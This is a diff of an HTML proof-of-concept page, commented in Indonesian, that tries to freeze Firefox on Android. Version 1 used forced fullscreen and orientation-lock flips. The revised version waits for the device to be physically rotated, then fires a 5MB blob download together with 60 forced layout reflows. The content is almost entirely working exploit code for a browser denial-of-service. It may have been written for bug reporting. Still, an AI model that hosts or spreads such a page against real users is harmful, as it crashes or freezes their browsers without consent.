@@ -2,132 +2,80 @@
 <html>
 <head>
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>FF Android Freeze POC</title>
+  <title>FF Android POC v2</title>
   <style>
     body { font-family: monospace; background: #111; color: #0f0; padding: 10px; }
-    button { padding: 12px 24px; font-size: 16px; margin: 5px; display: block; width: 100%; }
-    #log { margin-top: 10px; font-size: 12px; border: 1px solid #0f0; padding: 8px; min-height: 100px; }
-    .heavy { height: 300vh; background: repeating-linear-gradient(45deg, #222, #333 10px); }
+    button { padding: 14px; font-size: 16px; width: 100%; margin: 4px 0; }
+    #log { font-size: 11px; border: 1px solid #0f0; padding: 8px; min-height: 120px; margin-top: 8px; }
+    .heavy { height: 400vh; background: repeating-linear-gradient(45deg,#1a1a1a,#2a2a2a 8px); }
   </style>
 </head>
 <body>
-<h3>FF Android Freeze POC</h3>
+<h3>FF Android Freeze POC v2</h3>
+<p style="color:yellow;font-size:13px">
+  ⚠️ Tap "Arm POC" → lalu <b>putar device</b> secara fisik → freeze akan terjadi saat download + rotasi bersamaan
+</p>
 
-<button onclick="requestFullscreenAndTest()">Step 1: Enter Fullscreen</button>
-<button onclick="startPOC()" id="btnPOC" disabled>Step 2: Start POC</button>
+<button onclick="armPOC()">🔴 Arm POC (lalu putar device)</button>
+<button onclick="triggerDownloadNow()">⬇️ Manual: Trigger Download Saja</button>
 
-<div id="log"></div>
-<!-- Layout berat supaya reflow mahal -->
+<div id="log">Waiting...</div>
 <div class="heavy"></div>
 
 <script>
 const log = (m) => {
   const d = document.getElementById('log');
-  d.innerHTML += `[${Date.now() % 100000}] ${m}<br>`;
+  d.innerHTML += `[${(performance.now()|0)}ms] ${m}<br>`;
   d.scrollTop = d.scrollHeight;
 };
 
-// ===== Step 1: Fullscreen (wajib untuk screen.orientation.lock) =====
-async function requestFullscreenAndTest() {
-  try {
-    await document.documentElement.requestFullscreen({ navigationUI: "hide" });
-    log('[+] Fullscreen granted');
-    document.getElementById('btnPOC').disabled = false;
-  } catch(e) {
-    log('[-] Fullscreen failed: ' + e.message);
-    log('[*] Coba manual: putar device lalu jalankan Step 2');
-    document.getElementById('btnPOC').disabled = false;
+let armed = false;
+
+// Dengarkan orientasi fisik
+window.addEventListener('orientationchange', () => {
+  log('[!] orientationchange → ' + (screen.orientation?.type ?? window.orientation));
+  if (armed) {
+    log('[*] ARMED: memicu download + hammer bersamaan!');
+    triggerDownloadNow();
+    hammerLayout();
   }
+});
+
+window.addEventListener('resize', () => {
+  if (armed) {
+    log('[resize] ' + window.innerWidth + 'x' + window.innerHeight);
+  }
+});
+
+function armPOC() {
+  armed = true;
+  log('[+] POC ARMED — sekarang putar device secara fisik');
+  log('[*] Saat kamu rotate, download + reflow akan auto-terpicu');
 }
 
-// ===== Core POC =====
-async function startPOC() {
-  log('[*] POC started');
-
-  // Track orientationchange event
-  window.addEventListener('orientationchange', () => {
-    log('[!] orientationchange fired → type: ' + (screen.orientation?.type ?? window.orientation));
-  }, { once: false });
-
-  screen.orientation?.addEventListener('change', () => {
-    log('[!] screen.orientation change → ' + screen.orientation.type);
-  });
-
-  // Step A: Picu download via Blob (tidak di-block Firefox)
-  triggerDownload();
-
-  // Step B: Langsung lock orientasi → paksa Gecko reflow
-  // Jeda 200ms agar download bar muncul dulu
-  setTimeout(async () => {
-    await forceOrientationFlip();
-  }, 200);
-
-  // Step C: Banjir reflow tambahan saat orientasi sedang berubah
-  setTimeout(() => {
-    hammerlayout();
-  }, 250);
-}
-
-// ===== Download trigger =====
-function triggerDownload() {
-  // Buat Blob besar supaya download notification lebih lama muncul
-  const size = 5 * 1024 * 1024; // 5MB
-  const buf = new Uint8Array(size).fill(65);
+function triggerDownloadNow() {
+  // 5MB blob → download bar muncul lebih lama
+  const buf = new Uint8Array(5 * 1024 * 1024).fill(65);
   const blob = new Blob([buf], { type: 'application/octet-stream' });
   const url = URL.createObjectURL(blob);
   const a = document.createElement('a');
   a.href = url;
-  a.download = 'poc_test.bin';
+  a.download = 'poc.bin';
   document.body.appendChild(a);
   a.click();
   document.body.removeChild(a);
-  setTimeout(() => URL.revokeObjectURL(url), 3000);
-  log('[+] Download triggered (5MB blob)');
+  setTimeout(() => URL.revokeObjectURL(url), 5000);
+  log('[+] Download 5MB triggered');
 }
 
-// ===== Orientation flip via lock API =====
-async function forceOrientationFlip() {
-  const current = screen.orientation?.type ?? '';
-  const isPortrait = current.includes('portrait') || window.innerHeight > window.innerWidth;
-  const target = isPortrait ? 'landscape' : 'portrait';
-
-  log(`[*] Attempting orientation lock → ${target}`);
-  try {
-    await screen.orientation.lock(target);
-    log('[+] Lock berhasil → ' + screen.orientation.type);
-
-    // Flip balik setelah 600ms (double reflow)
-    setTimeout(async () => {
-      try {
-        await screen.orientation.lock(isPortrait ? 'portrait' : 'landscape');
-        log('[+] Flip balik berhasil');
-        screen.orientation.unlock();
-        log('[+] Unlocked');
-      } catch(e) {
-        log('[-] Flip balik gagal: ' + e.message);
-      }
-    }, 600);
-
-  } catch(e) {
-    log('[-] Lock gagal: ' + e.message);
-    log('[*] Fallback: gunakan physical rotation saat download muncul');
-  }
-}
-
-// ===== Layout hammer: paksa Gecko reflow berulang =====
-function hammerlayout() {
-  log('[*] Layout hammer started');
-  let count = 0;
-  const interval = setInterval(() => {
-    // Baca layout property → paksa flush reflow
-    const _ = document.body.getBoundingClientRect();
-    document.body.style.paddingTop = (count % 2 === 0) ? '1px' : '0px';
-    count++;
-    if (count >= 30) {
-      clearInterval(interval);
-      log('[*] Layout hammer done (' + count + ' reflows)');
-    }
-  }, 16); // ~60fps
+function hammerLayout() {
+  log('[*] Layout hammer: 60 reflows @ 16ms');
+  let i = 0;
+  const t = setInterval(() => {
+    void document.body.getBoundingClientRect();
+    document.documentElement.style.fontSize = (14 + (i % 2)) + 'px';
+    if (++i >= 60) { clearInterval(t); log('[*] Hammer selesai'); }
+  }, 16);
 }
 </script>
 </body>
